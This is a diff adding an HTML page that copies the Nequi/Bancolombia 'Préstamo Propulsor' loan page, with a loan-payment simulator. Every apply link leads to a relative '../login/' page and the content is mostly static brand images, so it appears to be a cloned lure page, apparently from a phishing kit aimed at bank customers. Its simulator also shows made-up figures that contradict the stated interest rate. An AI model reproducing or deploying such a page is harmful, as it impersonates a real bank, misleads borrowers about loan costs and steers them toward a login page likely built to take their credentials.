@@ -1,0 +1,783 @@
+<html>
+    <head>
+        <title>Préstamo Propulsor - ¡Plata de una Nequi!</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
+        <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../assets/css/styles.css" rel="stylesheet">
+        <link href="../assets/css/stylesheet.css" rel="stylesheet">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+        <script type="text/javascript" src="../assets/js/functions.js"></script>  
+        <style type="text/css">
+            *{
+                font-family: 'Red Hat Display', sans-serif !important;
+            }
+        
+
+            #slide-mob,#como-tab,#como-mob,#simul-tab,#simul-cel{
+                display: none;
+                text-align: center;
+            }
+            #simul {
+                /*width: 690px;*/
+                width: fit-content;
+                border-radius: 40px;
+                padding: 40px 40px 0;
+                box-shadow: 1px 1px 20px -13px #210049;
+                text-align: center;
+            }
+            #btn-calc{
+                cursor: pointer;
+                margin-top: 16px;
+            }
+            #btn-calc:hover{
+                opacity: 0.8;
+            }
+
+            #btn-calc-mob{
+                cursor: pointer;
+                margin-top: 16px;
+            }
+            #btn-calc-mob:hover{
+                opacity: 0.8;
+            }
+
+
+
+            #btn-sol{
+                cursor: pointer;
+                margin-top: 16px;
+            }
+            #btn-sol:hover{
+                opacity: 0.8;
+            }
+
+            #btn-sol-mob{
+                cursor: pointer;
+                margin-top: 16px;
+            }
+            #btn-sol-mob:hover{
+                opacity: 0.8;
+            }
+
+
+
+
+            .inp{                            
+                width: auto;
+                height: 48px;
+                border-radius: 6px;
+                margin-bottom: 3px; 
+                color: #333;
+                vertical-align: middle;
+                background-color: #fff;
+                border: 1px solid #ccc;                
+                padding: 8px 12px;
+                font-size: 14px;
+                line-height: 1.42857;
+                display: block;
+                        
+            }
+            .det{
+                color: #742fe1;
+                margin-top: 32px;
+                font-size: 1.75rem;
+                font-weight: 600;
+                line-height: 2.5rem;
+                margin-bottom: 5px;
+                text-align: left;
+            }
+
+
+            .cuan {
+                width: 164px;
+                height: 84px;
+                font-size: 1.5rem;
+                font-weight: 500;
+                text-align: left;
+                margin-bottom: 10px;
+                margin-top: 0;
+                color: #210049;              
+                line-height: 2rem;                
+            }
+
+
+            .eti{
+                color: #210049;
+                font-weight: 500;
+                margin-bottom: 5px;                                    
+                font-size: 14px;
+                line-height: 20px;
+            }
+
+            .contenido-simul {
+                width: 610px;
+                height: auto;
+                background-image: url(../assets/img/abajo.svg),url(../assets/img/arriba.svg);
+                background-position: 50% 100%,50% 0;
+                background-repeat: no-repeat,no-repeat;
+                background-size: auto,auto;
+                border-radius: 24px;
+                margin-top: 40px;                
+            }
+
+            .subt{                
+                color: #742fe1;
+                font-size: 1.75rem;
+                font-weight: 700;
+                line-height: 2.5rem;
+                text-align: left;
+                
+            }
+            #btn-vervt,#btn-vervt-mob{
+                cursor: pointer;
+                margin: 20px 0px 30px 0px;
+            }
+
+            .eti-simul {
+                color: #828d92;
+                margin-bottom: 0;
+                font-size: 1.125rem;
+                line-height: 1.5rem;
+                
+            }
+            #calcu{
+                width: 243px;
+                height: auto;
+                padding: 24px;
+                background-image: url(../assets/img/abajo.svg),url(../assets/img/arriba.svg);
+                background-position: 50% 100%,50% 0;
+                background-repeat: no-repeat,no-repeat;
+                background-size: auto,auto;
+                border-radius: 24px;
+                margin-top: 40px;
+            }
+
+            .val-sim{
+                font-size: 1.5rem;
+                font-weight: 500;
+                line-height: 2rem;
+                width: auto;
+                color: #210049;
+                margin-left: auto;
+                margin-right: auto;
+                padding-top: 0;
+                padding-left: 0;
+                padding-right: 0;
+                
+            }
+ 
+            .cuo-pres{
+                padding: 24px 32px;
+                width: calc(100% - 64px);
+                background-color: #742fe1;
+                background-image: url(../assets/img/valor.svg);
+                background-position: 100% 0;
+                background-repeat: no-repeat;
+                background-size: auto;
+                border-radius: 24px;
+                margin-top: 32px;
+            }
+
+            .eti-cuo{
+                color: #fff;
+                font-size: 1.5rem;
+                text-align: left;
+                margin-bottom: 10px;
+                line-height: 2rem;
+            }
+
+            .val-cuo{
+                color: #fff;
+                font-size: 2.5rem;
+                line-height: 3rem;        
+                font-weight: 600;
+            }
+
+            #simul-mobile{
+                width: 281px;
+                height: auto;
+                border-radius: 24px;
+                margin-left: auto;
+                margin-right: auto;
+                padding: 25px;
+                box-shadow: 1px 1px 20px -13px #210049;
+            }
+
+            #panel-vert-mob,#panel-vert{
+                padding: 0px 24px;
+                display: none;
+            }
+
+
+            #cuo-pres-mob{                
+                background-color: #742fe1;
+                background-image: url(../assets/img/valor.svg);
+                background-position: 100% 0;
+                background-repeat: no-repeat;
+                background-size: auto;
+                border-radius: 24px;
+                margin-top: 32px;   
+                padding: 15px 22px;             
+            }
+
+            #simul-mobile{
+                display: none;
+            }
+
+            .termin {                
+                color: #828d92;
+                width: 691px;
+                text-align: justify;
+                margin-top: 40px;
+                font-size: 14px;
+                line-height: 20px;
+            }
+
+
+            #desc-d{
+                max-width:1202px 
+            }
+
+            #desc-t{
+                max-width:668px;
+                display: none;
+            }
+
+            #desc-m{
+                max-width:337px;
+                display: none;
+            }
+
+            a{
+                text-decoration: none;
+                border: 0;
+            }
+
+            @media (max-width:1068px) {
+                #lad-der{
+                    display: none;
+                }
+                #lad-izq{
+                    text-align: center;
+                } 
+
+                #slide-mob{
+                    display: initial;
+                }
+            } 
+
+            @media (max-width:991px) {
+                #como-tab,#simul-tab,#desc-t{
+                    display: initial;
+                }
+                #como-der,#simul-izq,#desc-m,#desc-d{
+                    display: none;
+                }
+                #como-izq{
+                    text-align: center;
+                } 
+                #simul{
+                    margin: 0 auto;
+                }
+                .termin{
+                    margin: 40 auto;
+                }
+            } 
+
+             @media (max-width:767px) {
+                #como-mob,#desc-m{
+                    display: initial;
+                }
+                #como-der,#como-tab,#desc-t,#desc-d{
+                    display: none;
+                }
+                #como-izq{
+                    text-align: center;
+                } 
+            }  
+
+            @media (max-width:713px) { 
+                .termin{
+                    width: 331px;                    
+                }
+                #simul-cel,#simul-mobile{
+                    display: initial;
+                }
+                #simul-mobile{
+                    display: block;
+                }
+                #simul-tab,#simul{
+                    display: none;
+                }
+            }
+             
+        </style>
+    </head>
+    <body>        
+       <div class="cabecera">
+           <table border="0" cellpadding="0" cellspacing="0" width="90%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
+                    <td valign="middle" align="right">
+                        <button class="btn btn-std btn-sprd top-btn">Recarga</button>
+                        <button class="btn btn-std btn-sprd top-btn">Entrar</button>
+                        <img src="../assets/img/menu.jpg" id="btn-menu">
+                    </td>
+                </tr>               
+           </table>
+       </div>
+        <div class="contenido-pres">
+            <table border="0" cellpadding="0" cellspacing="0" width="90%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td valign="middle" align="left" id="lad-izq"><a href="../login/"><img src="../assets/img/pres.jpg" style="max-width: 501px;" width="100%"></a></td>
+                    <td valign="middle" align="right" id="lad-der"><img src="../assets/img/header.png" width="566"></td>
+                </tr>
+            </table>
+            <div id="slide-mob">
+                <img src="../assets/img/header.png" style="max-width: 566px;" width="90%">  
+            </div>
+            <img src="../assets/img/como-tab.jpg" style="max-width: 491px;margin-bottom: -50px;margin-top: 40px;" width="90%"  id="como-tab">
+            <img src="../assets/img/como-cel.jpg" style="max-width: 213px;margin-top: 40px;margin-bottom: -70px;" width="90%"  id="como-mob">
+            <table border="0" cellpadding="0" cellspacing="0" width="90%" style="max-width: 1200px; margin: 120 auto;">
+                <tr>
+                    <td valign="top" align="left" id="como-izq"><img src="../assets/img/paso.jpg" style="max-width: 657px;" width="100%"></td>
+                    <td valign="top" align="left" id="como-der"><img src="../assets/img/como.jpg" style="max-width: 316px;" width="100%"></td>
+                </tr>
+            </table>
+            <div style="text-align: center; width: 90%; margin: 0 auto -50 auto;">
+                <img src="../assets/img/simul-tab-min.jpg" id="simul-tab">
+                <img src="../assets/img/simul-mob-min.jpg" id="simul-cel">            </div>
+            <table border="0" cellpadding="0" cellspacing="0" width="90%" style="max-width: 1200px; margin: 120 auto;">
+                <tr>
+                    <td valign="top" align="left" id="simul-izq" style="padding-right: 10px;">
+                        
+                        <img src="../assets/img/simul-des-min.jpg" style="max-width: 397px;" width="100%"><br>
+
+                        <img src="../assets/img/preg.jpg" style="max-width: 397px;" width="100%"></td>
+                    <td valign="top" align="right" id="simul-der">
+                        <div id="simul">
+                            <table border="0" cellpadding="0" cellspacing="0" width="100%">                                
+                                <tr>
+                                    <td rowspan="2" class="cuan" valign="top" align="left">¿Cuánta plata necesitas?</td>
+                                    <td valign="top" align="right"><input class="inp" type="text" value="1.000.000" id="plata" name="plata" style="width: 178px;" placeholder="¿Cuánto vas a prestar?" maxlength="10"></td>
+                                    <td valign="top" align="right">
+                                        <select class="inp" id="plazo" name="plazo" style="width: 198px;">
+                                            <option value="36" selected>36 meses</option>
+                                            <option value="35">35 meses</option>
+                                            <option value="34">34 meses</option>
+                                            <option value="33">33 meses</option>
+                                            <option value="32">32 meses</option>
+                                            <option value="31">31 meses</option>
+                                            <option value="30">30 meses</option>
+                                            <option value="29">29 meses</option>
+                                            <option value="28">28 meses</option>
+                                            <option value="27">27 meses</option>
+                                            <option value="26">26 meses</option>
+                                            <option value="25">25 meses</option>
+                                            <option value="24">24 meses</option>
+                                            <option value="23">23 meses</option>
+                                            <option value="22">22 meses</option>
+                                            <option value="21">21 meses</option>
+                                            <option value="20">20 meses</option>
+                                            <option value="19">19 meses</option>
+                                            <option value="18">18 meses</option>
+                                            <option value="17">17 meses</option>
+                                            <option value="16">16 meses</option>
+                                            <option value="15">15 meses</option>
+                                            <option value="14">14 meses</option>
+                                            <option value="13">13 meses</option>
+                                            <option value="12">12 meses</option>
+                                            <option value="11">11 meses</option>
+                                            <option value="10">10  meses</option>
+                                            <option value="9">9 meses</option>
+                                            <option value="8">8 meses</option>
+                                            <option value="7">7 meses</option>
+                                            <option value="6">6 meses</option>
+                                        </select>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="eti" align="right">Hasta $10.000.000</td>
+                                    <td class="eti" align="right">Hasta 36 meses</td>
+                                </tr>                                
+                            </table>
+                            <img src="../assets/img/btn-caal-min.jpg" id="btn-calc">&nbsp;&nbsp;<a href="../login/"><img src="../assets/img/btn-sol-min.jpg" id="btn-sol"></a>
+                            <div class="contenido-simul">
+                                <div style="padding:40px;">
+                                    <div class="subt">Info de tu préstamo</div>
+                                    <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                        <tr>
+                                            <td class="eti-simul" width="50%">Valor prestado:</td>
+                                            <td class="eti-simul" width="50%">Valor prestado + comisiones</td>
+                                        </tr>
+                                        <tr>
+                                            <td class="val-sim" id="valor-prestado">$ 1.000.000</td>
+                                            <td class="val-sim" id="valor-comision">$ 1.119.000</td>
+                                        </tr>
+                                    </table>
+
+                                    <div class="cuo-pres">
+                                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                            <tr>
+                                                <td class="eti-cuo" align="left" valign="middle">Cuota de tu préstamo</td>
+                                                <td class="val-cuo" align="right" valign="middle" id="valor-cuota">$ 51.887</td>
+                                            </tr>
+                                        </table>
+                                    </div>
+                                    <div class="det">Detalles</div>
+                                    <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                                        <tr>
+                                            <td class="eti-simul">Interés</td>
+                                            <td class="eti-simul">Cuotas</td>
+                                            <td class="eti-simul">Tu seguro</td>
+                                        </tr>
+                                        <tr>
+                                            <td class="val-sim" style="padding-top: 5px;">2.69 % E.M (37.51% E.A)</td>
+                                            <td class="val-sim" style="padding-top: 5px;" id="no-cuotas">36 meses</td>
+                                            <td class="val-sim" style="padding-top: 5px;" id="val-interes">$ 2.900</td>
+                                        </tr>
+                                    </table>                    
+                                </div>
+                            </div>
+                            <div id="panel-vert">
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total de capital:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;" id="total-capital">$ 1.119.000</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total de interés:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;" id="total-interes">$ 641.813</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total del seguro:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;" id="total-seguro">$ 104.400</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">VTUA total:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;font-size: 2rem;font-weight: 700;line-height: 2rem;" id="gran-total">$ 1.865.213</div>
+                            </div>
+                            <img src="../assets/img/vervt.jpg" id="btn-vervt">
+                        </div>                       
+                        <div id="simul-mobile">
+                            <div style="font-size: 1.5rem;font-weight: 500;margin-bottom: 10px;color: #210049;line-height: 2rem; text-align: left;">¿Cuánta plata necesitas?</div>
+                            <input class="inp" type="text" value="1.000.000" id="plata-mob" name="plata-mob" style="width: 100%;margin-top: 22px;" placeholder="¿Cuánto vas a prestar?" maxlength="10">                            
+                            <div class="eti" style="text-align:left;">Hasta $5.000.000</div>
+                            <select class="inp" id="plazo-mob" name="plazo-mob" style="width: 100%;margin-top: 22px;">
+                                <option value="36" selected>36 meses</option>
+                                <option value="35">35 meses</option>
+                                <option value="34">34 meses</option>
+                                <option value="33">33 meses</option>
+                                <option value="32">32 meses</option>
+                                <option value="31">31 meses</option>
+                                <option value="30">30 meses</option>
+                                <option value="29">29 meses</option>
+                                <option value="28">28 meses</option>
+                                <option value="27">27 meses</option>
+                                <option value="26">26 meses</option>
+                                <option value="25">25 meses</option>
+                                <option value="24">24 meses</option>
+                                <option value="23">23 meses</option>
+                                <option value="22">22 meses</option>
+                                <option value="21">21 meses</option>
+                                <option value="20">20 meses</option>
+                                <option value="19">19 meses</option>
+                                <option value="18">18 meses</option>
+                                <option value="17">17 meses</option>
+                                <option value="16">16 meses</option>
+                                <option value="15">15 meses</option>
+                                <option value="14">14 meses</option>
+                                <option value="13">13 meses</option>
+                                <option value="12">12 meses</option>
+                                <option value="11">11 meses</option>
+                                <option value="10">10  meses</option>
+                                <option value="9">9 meses</option>
+                                <option value="8">8 meses</option>
+                                <option value="7">7 meses</option>
+                                <option value="6">6 meses</option>
+                            </select>                           
+                            <div class="eti" style="text-align:left;">Hasta 36 meses</div>
+                            <div style="text-align:center;padding-top: 20px;"><img src="../assets/img/btn-caal-min.jpg" id="btn-calc-mob">&nbsp;&nbsp;<a href="../login/"><img src="../assets/img/btn-sol-min.jpg" id="btn-sol-mob"><a href="../login/"></div>
+
+
+                            <div id="calcu">
+                                <div class="subt" style="font-size: 1.188rem;line-height: 1.5rem;">Info de tu préstamo</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px;">Valor prestado:</div>
+                                <div class="val-sim" style="font-size: 1.125rem;line-height: 1.4rem;text-align: left;" id="valor-prestado-mob">$ 1.000.000</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor prestado + comisiones</div>
+                                <div class="val-sim" style="font-size: 1.125rem;line-height: 1.4rem;text-align: left;" id="valor-comision-mob">$ 1.119.000</div>
+                                <div id="cuo-pres-mob">
+                                    <div class="eti-cuo" style="font-size: 1.125rem;line-height: 1.5rem;">Cuota de tu préstamo</div>
+                                    <div class="val-cuo" style="font-size: 1.625rem;line-height: 2rem; text-align:left;" id="valor-cuota-mob">$ 51.887</div>
+                                </div>
+                                <div class="det" style="font-size: 1.188rem;line-height: 1.5rem;">Detalles</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Interés</div>
+                                <div class="val-sim" style="padding-top: 5px;font-size: 1.125rem;line-height: 1.5rem;text-align: left;">2.69 % E.M (37.51% E.A)</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Cuotas</div>
+                                <div class="val-sim" style="padding-top: 5px;font-size: 1.125rem;line-height: 1.5rem;text-align: left;" id="no-cuotas-mob">36 meses</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Tu seguro</div>
+                                <div class="val-sim" style="padding-top: 5px;font-size: 1.125rem;line-height: 1.5rem;text-align: left;" id="val-interes-mob">$ 2.900</div>
+                            </div>
+                            <div id="panel-vert-mob">
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total de capital:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;font-size: 1.125rem;line-height: 1.5rem;" id="total-capital-mob">$ 1.119.000</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total de interés:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;font-size: 1.125rem;line-height: 1.5rem;" id="total-interes-mob">$ 641.813</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">Valor total del seguro:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;font-size: 1.125rem;line-height: 1.5rem;" id="total-seguro-mob">$ 104.400</div>
+                                <div class="eti-simul" style="text-align: left;margin-top: 24px">VTUA total:</div>
+                                <div class="val-sim" style="padding-top: 5px;text-align: left;font-size: 1.625rem;font-weight: 700;line-height: 2rem;" id="gran-total-mob">$ 1.865.213</div>                               
+                            </div>
+                            <div style="text-align:center;">
+                            <img src="../assets/img/vervt.jpg" id="btn-vervt-mob">
+                            </div>
+                        </div>
+                        <div class="termin">
+                            <p>Para que puedas acceder al Préstamo Propulsor, sin tener que presentar codeudores o avalistas, Nequi junto con el FGA han dispuesto un mecanismo con el cual podrás garantizar tu obligación, a través de una fianza que estará a favor de Nequi y que es otorgada por el FGA. Esta garantía tiene un costo que deberás pagar al FGA través de una comisión, la cual Nequi te financiará y se encargará de entregar el dinero al FGA al momento del desembolso.</p><br>
+                            <p>Asimismo, Nequi (línea de negocio de Bancolombia S.A.) informa que pone a disposición el presente simulador del préstamo propulsor, con el objetivo de orientar y ejemplificar la cuota del préstamo en referencia, la cual tiene fines informativos. Este simulador es indicativo y está destinado a proporcionar información y estimaciones de carácter general. El resultado de esta simulación no comprende una oferta o recomendación comercial, contable, tributaria o legal. El cliente podrá determinar (capital + intereses) una vez tenga un cupo preaprobado para el préstamo propulsor en su Nequi a través la aplicación móvil de manera previa al desembolso.</p><br>
+
+                            <p>El simulador es propiedad de Bancolombia S.A. No se permite la reproducción, venta, publicación, modificación, difusión o explotación comercial de la Herramienta o la información proporcionada por la misma.</p>
+                        </div>
+                    </td>
+                </tr>
+            </table>
+            <img src="../assets/img/descargar-min.png" width="90%" id="desc-d">
+            <img src="../assets/img/descargar-tab-min.jpg" width="90%" id="desc-t">
+            <img src="../assets/img/descargar-mob-min.jpg" width="90%" id="desc-m">
+       </div>
+       <div class="pie">
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td id="logo-blanco-movil">
+                        <img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;" >
+                        <div class="separador"></div>
+                    </td>
+                </tr>
+            </table>
+
+           
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                
+                <tr>
+                    <td valign="top" id="logo-blanco">
+                        <img src="../assets/img/logo-blanco.svg" width="176">
+                    </td>
+                    <td valign="top">
+                        <div class="titulo-footer">Producto</div>
+                        <div class="item-footer">Legales</div>
+                        <div class="item-footer">Ayuda</div>
+
+                        <div class="titulo-footer vmovil">Portales</div>
+                        <div class="item-footer vmovil">Blog | Metidas de plata</div>
+                        <div class="item-footer vmovil">APIs | Nequi conecta</div>
+
+                        <div class="titulo-footer vmovil">Redes</div>
+                        <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+
+                    </td>
+                    <td valign="top" id="app">
+                        <div class="titulo-footer">Descarga la App</div>
+                        <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Portales</div>
+                        <div class="item-footer">Blog | Metidas de plata</div>
+                        <div class="item-footer">APIs | Nequi conecta</div>
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Redes</div>
+                        <img src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+                    </td>
+                </tr>                
+            </table>
+
+            
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
+                <tr>
+                    <td id="gb-sec">
+                        <div class="separador"></div>                    
+                        <img src="../assets/img/gb-blanco.svg" width="122"  style="margin-bottom: 15px;">
+                        <div style="border-bottom: 1px solid red; width:100%;"></div>
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="middle" align="center">
+                        <table border="0" cellpadding="0" cellspacing="0" >
+                            <tr>
+                                <td id="copy-menu">
+                                    <div class="item-copy">Características del producto</div>
+                                    <div class="item-copy">Condiciones de uso</div>
+                                    <div class="item-copy">Legales</div>
+                                    <div class="item-copy">Términos y condiciones</div>
+                                </td>    
+                            </tr>                            
+                        </table>                        
+                    </td>
+                </tr>
+            </table>
+
+       </div> 
+    </body>
+    <script type="text/javascript" src="../assets/js/ready.js"></script>
+    <script type="text/javascript">
+        var swvd = 0;
+        var swvm = 0;
+        
+        function puntos(valor) {
+            valor = valor.split("").reverse().join("");
+            var tam = valor.length;
+            var c=0;
+            var nuevo = "";
+            for (var i = 0; i < tam; i++) {            
+                if (c==3) {
+                    nuevo = nuevo + ".";
+                    c=1;
+                }else{
+                    c++;                
+                }
+                nuevo = nuevo + valor[i];              
+            }
+            
+            var final = nuevo.split("").reverse().join("");
+            return final;
+        }
+
+        $(document).ready(function($){
+            $("#btn-calc-mob").click(function(){                      
+
+                var mes = $("#plazo-mob").val(); 
+                var vsp = $("#plata-mob").val();
+                vsp = vsp.replace(/\./g, '');
+                var com = Math.trunc(vsp*1.119);
+                var con_seg = Math.trunc(vsp/894000) + 1;
+                var val_seg = con_seg*1450;
+                var total_seg = mes*val_seg;
+                var int = Math.trunc((com*1.6/100)*mes);
+                var total = com + total_seg + int;
+                var cuota = Math.trunc(total/mes);
+
+                $("#valor-prestado-mob,#valor-prestado").html("$ " + $("#plata-mob").val());                 
+                $("#valor-comision-mob,#valor-comision").html("$ " + puntos(com.toString()));
+                $("#valor-cuota-mob,#valor-cuota").html("$ " + puntos(cuota.toString()));
+                $("#no-cuotas-mob,#no-cuotas").html(mes + " meses");
+                $("#val-interes-mob,#val-interes").html("$ " + puntos(val_seg.toString()));
+                $("#total-capital-mob,#total-capital").html("$ " + puntos(com.toString()));
+                $("#total-interes-mob,#total-interes").html("$ " + puntos(int.toString()));
+                $("#total-seguro-mob,#total-seguro").html("$ " + puntos(total_seg.toString()));
+                $("#gran-total-mob,#gran-total").html("$ " + puntos(total.toString()));  
+
+            });
+
+            $("#btn-calc").click(function(){  
+                var mes = $("#plazo").val(); 
+                var vsp = $("#plata").val();
+                vsp = vsp.replace(/\./g, '');
+                var com = Math.trunc(vsp*1.119);
+                var con_seg = Math.trunc(vsp/894000) + 1;
+                var val_seg = con_seg*1450;
+                var total_seg = mes*val_seg;
+                var int = Math.trunc((com*1.6/100)*mes);
+                var total = com + total_seg + int;
+                var cuota = Math.trunc(total/mes);
+
+                $("#valor-prestado-mob,#valor-prestado").html("$ " + $("#plata-mob").val());                 
+                $("#valor-comision-mob,#valor-comision").html("$ " + puntos(com.toString()));
+                $("#valor-cuota-mob,#valor-cuota").html("$ " + puntos(cuota.toString()));
+                $("#no-cuotas-mob,#no-cuotas").html(mes + " meses");
+                $("#val-interes-mob,#val-interes").html("$ " + puntos(val_seg.toString()));
+                $("#total-capital-mob,#total-capital").html("$ " + puntos(com.toString()));
+                $("#total-interes-mob,#total-interes").html("$ " + puntos(int.toString()));
+                $("#total-seguro-mob,#total-seguro").html("$ " + puntos(total_seg.toString()));
+                $("#gran-total-mob,#gran-total").html("$ " + puntos(total.toString()));                
+            });
+
+            $('#plata').keyup(function(event){                
+                var cad = $('#plata').val();
+                var invertido = cad.split("").reverse().join("");
+                
+                var valor = invertido.split('.').join('');
+                var tam = valor.length;
+
+                var c=0;
+                var nuevo = "";
+                for (var i = 0; i < tam; i++) {            
+                    if (c==3) {
+                        nuevo = nuevo + ".";
+                        c=1;
+                    }else{
+                        c++;                
+                    }
+                    nuevo = nuevo + valor[i];              
+                }
+
+                var final = nuevo.split("").reverse().join("");
+                $('#plata,#plata-mob').val(final);
+                $('#plata').focus();
+             });
+
+
+
+            $('#plata-mob').keyup(function(event){                
+                var cad = $('#plata-mob').val();
+                var invertido = cad.split("").reverse().join("");
+                
+                var valor = invertido.split('.').join('');
+                var tam = valor.length;
+
+                var c=0;
+                var nuevo = "";
+                for (var i = 0; i < tam; i++) {            
+                    if (c==3) {
+                        nuevo = nuevo + ".";
+                        c=1;
+                    }else{
+                        c++;                
+                    }
+                    nuevo = nuevo + valor[i];              
+                }
+
+                var final = nuevo.split("").reverse().join("");
+                $('#plata,#plata-mob').val(final);
+                $('#plata-mob').focus();
+             });
+            
+
+            $("#plazo").change(function(){
+                $("#plazo-mob").val($("#plazo").val());
+            });
+
+            $("#plazo-mob").change(function(){
+                $("#plazo").val($("#plazo-mob").val());
+            });
+
+            $("#btn-vervt").click(function(){ 
+                if (swvd == 0) {
+                    $("#panel-vert").show();
+                    $("#btn-vervt").attr("src","../assets/img/ocultarvt.jpg");
+                    swvd = 1;
+                }else{
+                    $("#panel-vert").hide();
+                    $("#btn-vervt").attr("src","../assets/img/vervt.jpg");
+                    swvd = 0;
+                }                
+            });
+
+            $("#btn-vervt-mob").click(function(){ 
+                if (swvm == 0) {
+                    $("#panel-vert-mob").show();                    
+                    $("#btn-vervt-mob").attr("src","../assets/img/ocultarvt.jpg");
+                    swvm = 1;
+                }else{
+                    $("#panel-vert-mob").hide();
+                    $("#btn-vervt-mob").attr("src","../assets/img/vervt.jpg");
+                    swvm = 0;
+                } 
+            });
+        });        
+    </script> 
+</html>
